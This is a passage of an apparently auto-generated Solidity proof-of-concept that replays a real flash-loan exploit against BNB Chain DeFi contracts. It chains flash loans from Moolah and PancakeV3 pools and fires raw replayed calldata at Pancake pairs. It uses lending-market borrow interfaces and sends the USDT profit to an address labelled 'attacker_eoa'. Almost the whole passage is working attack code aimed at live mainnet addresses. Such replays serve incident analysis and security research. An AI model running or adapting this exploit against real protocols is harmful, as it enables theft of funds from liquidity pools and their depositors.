                hex"490e6cbc00000000000000000000000080bd723dc38a07952db40c1c2a45084714399bd9000000000000000000000000000000000000000000190985dc6cd7f202a30b960000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000190985dc6cd7f202a30b9600000000000000000000000000000000000000000014b8db4b2be15014e58e03"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0064 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.A_92B780_3121.call(observedCallData);
            require(ok, "observed raw calldata 0x490e6cbc failed");
        }
        {
            uint256 transferLiveAmount = 55325125127061005735890469; // artifact amount preserved for Addresses.USDT movement from address(this); replay-safe live balance cap/reserve disabled
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).transfer(Addresses.A_B67E5E_EB0F, transferLiveAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function flashCallback4() internal {
        _replayDone[REPLAY_CALLBACK_10] = true;
        flashCallback13();
    }

    function flashCallback13() internal {
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        ICake_LP_E0D8(Addresses.Cake_LP_E0D8).token0();
        {
            if (Addresses.USDT.code.length != 0) {
                IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_E0D8);
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            bytes memory observedCallData =
                hex"022c0d9f0000000000000000000000000000000000000000001cfa0658f19ed1cbaae18e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080bd723dc38a07952db40c1c2a45084714399bd90000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001cfa0658f19ed1cbaae18e00000000000000000000000000000000000000000011fe4e1e9a558d843d8720"; // artifact calldata preserved: abi_call; preserving observed calldata; action_graph action_0069 has artifact-backed dynamic_bytes_payload_precondition; preserving exact calldata before ABI re-encoding
            (bool ok,) = Addresses.Cake_LP_E0D8.call(observedCallData);
            require(ok, "observed raw calldata 0x022c0d9f failed");
        }
        {
            uint256 usdtTransferAmount = 3177282879540209064564485; // pseudocode/artifact priority: value provenance: arg1=3177282879540209064564485 is covered by prior Addresses.USDT.balanceOf(address) return=35030631659469839079760271 with args (Addresses.Cake_LP_E0D8); do not cap to address(this)
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, usdtTransferAmount);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _borrowLiquidity() internal {
        _settleTokenFlows3();
    }

    function _settleTokenFlows3() internal {
        IERC20Like(Addresses.BTCB).balanceOf(Addresses.attack_contract_5D8C);
        {
            bytes memory flashLoanProof = abi.encode(address(0));
            bytes memory helperData = abi.encodeWithSignature(
                "flashLoan(address,uint256,bytes)", Addresses.BTCB, 1034944327269360892040, flashLoanProof
            );
            _decodedCall(Addresses.attack_contract_5D8C, helperData);
        }
        uint256 attackUsdtBalance = 0; // low-confidence trace target default; assigned only if runtime code exists
        {
            if (Addresses.USDT.code.length != 0) {
                attackUsdtBalance = IERC20Like(Addresses.USDT).balanceOf(address(this));
            } else {
                console2.log(
                    "PoCWarning",
                    "skipping missing-code observed typed call",
                    "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                );
            }
        }
        {
            {
                if (Addresses.USDT.code.length != 0) {
                    IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, attackUsdtBalance);
                } else {
                    console2.log(
                        "PoCWarning",
                        "skipping missing-code observed typed call",
                        "Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium"
                    );
                }
            }
        }
    }

    function _runExploitPath2() internal {
        _replayDone[REPLAY_CALLBACK_12] = true;
    }

    function _flashLoan4() internal {
        {
            bytes memory flashLoanProof = abi.encode(0x0000000000000000000000000000000000000002);
            bytes memory delegateData = abi.encodeWithSignature(
                "flashLoan(address,uint256,bytes)", Addresses.USDT, 10253575735972056488128180, flashLoanProof
            ); // observed selector 0xe0232b42
            (bool ok,) = Addresses.Moolah.delegatecall(delegateData);
            require(ok, "delegatecall failed"); // delegatecall flashLoan(address,uint256,bytes)
        }
    }

    function _flashLoan5() internal {
        {
            bytes memory flashLoanProof = abi.encode(address(0));
            bytes memory delegateData = abi.encodeWithSignature(
                "flashLoan(address,uint256,bytes)", Addresses.BTCB, 1034944327269360892040, flashLoanProof
            ); // observed selector 0xe0232b42
            (bool ok,) = Addresses.Moolah.delegatecall(delegateData);
            require(ok, "delegatecall failed"); // delegatecall flashLoan(address,uint256,bytes)
        }
    }

    function _flashLoan6() internal {
        {
            bytes memory flashLoanProof = abi.encode(0x0000000000000000000000000000000000000001);
            bytes memory delegateData = abi.encodeWithSignature(
                "flashLoan(address,uint256,bytes)", Addresses.WBNB, 285685446507753717242029, flashLoanProof
            ); // observed selector 0xe0232b42
            (bool ok,) = Addresses.Moolah.delegatecall(delegateData);
            require(ok, "delegatecall failed"); // delegatecall flashLoan(address,uint256,bytes)
        }
    }

    receive() external payable {}

    function onMoolahFlashLoan(uint256 amount, bytes calldata arg1) external payable {
        amount;
        arg1;
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (arg0 == 1034944327269360892040) {
                _flashLoan3();
                return;
            }
        }
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (arg0 == 285685446507753717242029) {
                _flashLoan();
                return;
            }
        }
        {
            uint256 arg0;
            assembly { arg0 := calldataload(4) }
            if (arg0 == 10253575735972056488128180) {
                _flashLoan2();
                return;
            }
        }
        _flashLoan3();
        return;
    }

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external payable {
        amount0;
        amount1;
        data;
        if (msg.sender == 0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F) {
            if (!_replayDone[REPLAY_CALLBACK_9]) flashCallback3();
            return;
        }
        if (msg.sender == 0x92b7807bF19b7DDdf89b706143896d05228f3121) {
            if (!_replayDone[REPLAY_CALLBACK_8]) flashCallback2();
            return;
        }
        if (msg.sender == 0xcF59B8C8BAA2dea520e3D549F97d4e49aDE17057) {
            if (!_replayDone[REPLAY_CALLBACK_7]) flashCallback();
            return;
        }
        if (msg.sender == 0x172fcD41E0913e95784454622d1c3724f546f849) {
            if (!_replayDone[REPLAY_CALLBACK_10]) flashCallback4();
            return;
        }
        if (!_replayDone[REPLAY_CALLBACK_9]) flashCallback3();
        return;
    }

    function flashLoan(address asset, uint256 amount, bytes calldata callbackData) external payable {
        asset;
        amount;
        callbackData;
        {
            uint256 encodedAsset;
            assembly { encodedAsset := calldataload(4) }
            if (address(uint160(encodedAsset)) == 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c) {
                _flashLoan5();
                bytes memory emptyReturn0 = hex"";
                assembly { return(add(emptyReturn0, 32), mload(emptyReturn0)) }
            }
        }
        {
            uint256 encodedAsset;
            assembly { encodedAsset := calldataload(4) }
            if (address(uint160(encodedAsset)) == 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
                _flashLoan6();
                bytes memory emptyReturn1 = hex"";
                assembly { return(add(emptyReturn1, 32), mload(emptyReturn1)) }
            }
        }
        {
            uint256 encodedAsset;
            assembly { encodedAsset := calldataload(4) }
            if (address(uint160(encodedAsset)) == 0x55d398326f99059fF775485246999027B3197955) {
                _flashLoan4();
                bytes memory emptyReturn2 = hex"";
                assembly { return(add(emptyReturn2, 32), mload(emptyReturn2)) }
            }
        }
        _flashLoan5();
        bytes memory emptyReturn = hex"";
        assembly { return(add(emptyReturn, 32), mload(emptyReturn)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x84800812) {
            if (msg.sender == 0xCAaF3c41a40103a23Eeaa4BbA468AF3cF5b0e0D8) {
                if (!_replayDone[REPLAY_CALLBACK_6]) _handleCallback3();
                return;
            }
            if (msg.sender == 0xDe66f1b24002c1d743AD1EF13cD4B2474295A6F6) {
                if (!_replayDone[REPLAY_CALLBACK_4]) _handleFlashLoanCall();
                return;
            }
            if (msg.sender == 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE) {
                if (!_replayDone[REPLAY_CALLBACK_5]) _handleCallback2();
                return;
            }
            if (!_replayDone[REPLAY_CALLBACK_6]) _handleCallback3();
            return;
        }
        if (msg.sig == 0xbe2684d4) {
            _borrowLiquidity();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    bytes32 private constant REPLAY_CALLBACK_5 = keccak256("poc.replay.REPLAY_CALLBACK_5");
    bytes32 private constant REPLAY_CALLBACK_6 = keccak256("poc.replay.REPLAY_CALLBACK_6");
    bytes32 private constant REPLAY_CALLBACK_7 = keccak256("poc.replay.REPLAY_CALLBACK_7");
    bytes32 private constant REPLAY_CALLBACK_8 = keccak256("poc.replay.REPLAY_CALLBACK_8");
    bytes32 private constant REPLAY_CALLBACK_9 = keccak256("poc.replay.REPLAY_CALLBACK_9");
    bytes32 private constant REPLAY_CALLBACK_10 = keccak256("poc.replay.REPLAY_CALLBACK_10");
    bytes32 private constant REPLAY_CALLBACK_12 = keccak256("poc.replay.REPLAY_CALLBACK_12");
    mapping(bytes32 => bool) private _replayDone;

    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "attack child dispatch failed");
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant Moolah = 0x0af5cD9555Bc52C34a5f7b20042109D0136Bc34f; // Addresses.Moolah = 0x0af5cd9555bc52c34a5f7b20042109d0136bc34f label=Moolah roles=code_contract|recipient source=etherscan_v2 confidence=high
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // Addresses.PancakeRouter = 0x10ed43c718714eb63d5aa57b78b54704e256024e label=PancakeRouter roles=attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE; // Addresses.Cake_LP = 0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae label=unresolved token_symbol=Cake-LP roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849; // Addresses.PancakeV3Pool = 0x172fcd41e0913e95784454622d1c3724f546f849 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDA = 0x17EAfd08994305D8AcE37EfB82F1523177eC70EE; // Addresses.USDA = 0x17eafd08994305d8ace37efb82f1523177ec70ee label=unresolved token_symbol=USDA roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant MarketingDistributorProxy = 0x4073719925c04672Add1bC75cEE3C76d100Dd0Ae; // Addresses.MarketingDistributorProxy = 0x4073719925c04672add1bc75cee3c76d100dd0ae label=MarketingDistributorProxy roles=attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant A_55D398_7954 = 0x55D398326F99059Ff775485246999027B3197954; // Addresses.A_55D398_7954 = 0x55d398326f99059ff775485246999027b3197954 label=unresolved roles=attack_address source=unresolved confidence=low
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955; // Addresses.USDT = 0x55d398326f99059ff775485246999027b3197955 label=USDT token_symbol=USDT roles=asset|contract|economic_asset|attack_address|profit_asset|recipient|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant A_57F4DF_E22D = 0x57F4dFF6F9404c1c89D5d0457e26C87FfBD9E22D; // Addresses.A_57F4DF_E22D = 0x57f4dff6f9404c1c89d5d0457e26c87ffbd9e22d label=unresolved roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant OptimizedTransparentUpgradeableProxy = 0x6592b5DE802159F3E74B2486b091D11a8256ab8A; // Addresses.OptimizedTransparentUpgradeableProxy = 0x6592b5de802159f3e74b2486b091d11a8256ab8a label=OptimizedTransparentUpgradeableProxy roles=attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c; // Addresses.BTCB = 0x7130d2a12b9bcbfae4f2634d864a1ee1ce3ead9c label=BEP20Token token_symbol=BTCB roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant attack_contract = 0x80bd723DC38A07952dB40C1C2A45084714399bD9; // Addresses.attack_contract = 0x80bd723dc38a07952db40c1c2a45084714399bd9 label=attack_contract roles=asset|attacker_callback_contract|attacker_contract|attacker_entry_contract|attacker_surface_contract|code_contract|contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d; // Addresses.USDC = 0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d label=unresolved token_symbol=USDC roles=asset|contract|attack_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant attack_contract_5D8C = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C; // Addresses.attack_contract_5D8C = 0x8f73b65b4caaf64fba2af91cc5d4a2a1318e5d8c label=attack_contract roles=asset|attacker_contract|attacker_surface_contract|code_contract|contract|localized_contract|attack_address|recipient|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_92B780_3121 = 0x92b7807bF19b7DDdf89b706143896d05228f3121; // Addresses.A_92B780_3121 = 0x92b7807bf19b7dddf89b706143896d05228f3121 label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant Cake_LP_CE70 = 0x9B0FF36de2FC477cdA8E4468e0067322Ae18ce70; // Addresses.Cake_LP_CE70 = 0x9b0ff36de2fc477cda8e4468e0067322ae18ce70 label=unresolved token_symbol=Cake-LP roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant attacker_eoa = 0x9dF9A1D108EE9c667070514b9A238B724a86094F; // Addresses.attacker_eoa = 0x9df9a1d108ee9c667070514b9a238b724a86094f label=attacker_eoa roles=attacker_eoa|contract|economic_holder|attack_address|profit_holder|recipient|sender source=tx_metadata.from confidence=high
    address internal constant vBNB = 0xA07c5b74C9B40447a954e1466938b865b6BBea36; // Addresses.vBNB = 0xa07c5b74c9b40447a954e1466938b865b6bbea36 label=unresolved token_symbol=vBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant DUSD = 0xaf44A1E76F56eE12ADBB7ba8acD3CbD474888122; // Addresses.DUSD = 0xaf44a1e76f56ee12adbb7ba8acd3cbd474888122 label=unresolved token_symbol=DUSD roles=asset|contract|attack_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_B41327_7854 = 0xB413271B84902C95f01015D58326DDA59A747854; // Addresses.A_B41327_7854 = 0xb413271b84902c95f01015d58326dda59a747854 label=unresolved roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant A_B67E5E_EB0F = 0xB67e5EaF770a384Ab28029d08B9bC5EBE32beb0F; // Addresses.A_B67E5E_EB0F = 0xb67e5eaf770a384ab28029d08b9bc5ebe32beb0f label=unresolved roles=asset|contract|attack_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C; // Addresses.USDC_0B5C = 0xba5fe23f8a3a24bed3236f05f2fcf35fd0bf0b5c label=BEP20TokenImplementation token_symbol=USDC roles=asset|contract|attack_address|recipient source=etherscan_v2 confidence=high
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; // Addresses.WBNB = 0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c label=unresolved token_symbol=WBNB roles=asset|code_contract|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low
    address internal constant XPL = 0xC2c4ccde8948c693D0B04F8bad461e35A12F20b8; // Addresses.XPL = 0xc2c4ccde8948c693d0b04f8bad461e35a12f20b8 label=unresolved token_symbol=XPL roles=asset|contract|attack_address|recipient|sender|storage_contract|token_related source=unresolved confidence=low
    address internal constant Cake_LP_E0D8 = 0xCAaF3c41a40103a23Eeaa4BbA468AF3cF5b0e0D8; // Addresses.Cake_LP_E0D8 = 0xcaaf3c41a40103a23eeaa4bba468af3cf5b0e0d8 label=PancakePair token_symbol=Cake-LP roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ARK = 0xCae117ca6Bc8A341D2E7207F30E180f0e5618B9D; // Addresses.ARK = 0xcae117ca6bc8a341d2e7207f30e180f0e5618b9d label=unresolved token_symbol=ARK roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant PancakeV3Pool_7057 = 0xcF59B8C8BAA2dea520e3D549F97d4e49aDE17057; // Addresses.PancakeV3Pool_7057 = 0xcf59b8c8baa2dea520e3d549f97d4e49ade17057 label=PancakeV3Pool roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant XVS = 0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63; // Addresses.XVS = 0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63 label=unresolved token_symbol=XVS roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant Cake_LP_A6F6 = 0xDe66f1b24002c1d743AD1EF13cD4B2474295A6F6; // Addresses.Cake_LP_A6F6 = 0xde66f1b24002c1d743ad1ef13cd4b2474295a6f6 label=PancakePair token_symbol=Cake-LP roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant KOGE = 0xe6DF05CE8C8301223373CF5B969AFCb1498c5528; // Addresses.KOGE = 0xe6df05ce8c8301223373cf5b969afcb1498c5528 label=unresolved token_symbol=KOGE roles=asset|contract|attack_address|recipient source=unresolved confidence=low
    address internal constant Unitroller = 0xfD36E2c2a6789Db23113685031d7F16329158384; // Addresses.Unitroller = 0xfd36e2c2a6789db23113685031d7f16329158384 label=Unitroller roles=asset|contract|attack_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant vUSDT = 0xfD5840Cd36d94D7229439859C0112a4185BC0255; // Addresses.vUSDT = 0xfd5840cd36d94d7229439859c0112a4185bc0255 label=VBep20Delegator token_symbol=vUSDT roles=asset|contract|attack_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF; // Addresses.A_FFFFFF_FFFF = 0xffffffffffffffffffffffffffffffffffffffff label=unresolved roles=attack_address source=unresolved confidence=low
}

interface ICake_LP {
    function token0() external view returns (uint256);
}

interface ICake_LP_A6F6 {
    function token0() external view returns (uint256);
}

interface ICake_LP_E0D8 {
    function token0() external view returns (uint256);
}

interface IContract_92B780_3121 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IContract_B41327_7854 {
    function DynamicBurnPool(string calldata, uint256) external;
    function dayTotalBurnedList(string calldata) external view returns (uint256);
    function daytotalNeedBurnList(string calldata) external view returns (uint256);
}

interface IContract_B67E5E_EB0F {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IOptimizedTransparentUpgradeableProxy {
    function getUnderlyingPrice(address) external view returns (uint256);
}

interface IPancakeRouter {
    function getAmountsIn(uint256, address[] calldata) external view;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IPancakeV3Pool_7057 {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface IUnitroller {
    function borrowCaps(address) external returns (uint256);
    function enterMarkets(address[] calldata) external;
    function markets(address) external view;
    function supplyCaps(address) external returns (uint256);
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface Iattack_contract {
    function onMoolahFlashLoan(uint256, bytes calldata) external;
}

interface Iattack_contract_5D8C {
    function flashLoan(address, uint256, bytes calldata) external;
}

interface IvBNB {
    function exchangeRateStored() external view returns (uint256);
    function mint() external payable;
    function redeemUnderlying(uint256) external returns (uint256);
    function mint(address to) external returns (uint256 liquidity);
}

interface IvUSDT {
    function borrow(uint256) external returns (uint256);
    function getCash() external view;
    function repayBorrow(uint256) external returns (uint256);
    function totalBorrows() external view returns (uint256);
}
